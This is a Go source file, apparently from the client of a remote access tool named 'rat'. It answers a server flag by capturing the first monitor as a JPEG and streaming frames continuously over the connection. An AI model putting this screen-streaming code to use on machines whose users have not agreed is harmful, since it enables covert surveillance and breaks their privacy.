package main

import (
	"bytes"
	"image/jpeg"
	"rat/client/screen"
	"rat/common"
)

var screenStream bool

type ScreenPacket struct {
	IncomingPacket
	OutgoingPacket
}

func (packet ScreenPacket) GetHeader() common.PacketHeader {
	return common.ScreenHeader
}

func (packet ScreenPacket) Read(c *Connection) error {
	run, err := c.ReadBool()

	screenStream = run

	if run {
		// Dispatch one screen packet
		Queue <- ScreenPacket{}
	}

	return err
}

func (packet ScreenPacket) Write(c *Connection) error {
	screen.QueryMonitors()

	var w bytes.Buffer

	jpeg.Encode(&w, screen.Capture(screen.Monitors[0]), &jpeg.Options{
		Quality: 75,
	})

	c.WriteInt(len(w.Bytes()))
	c.Write(w.Bytes())

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- ScreenPacket{}
		}()
	}

	return nil
}
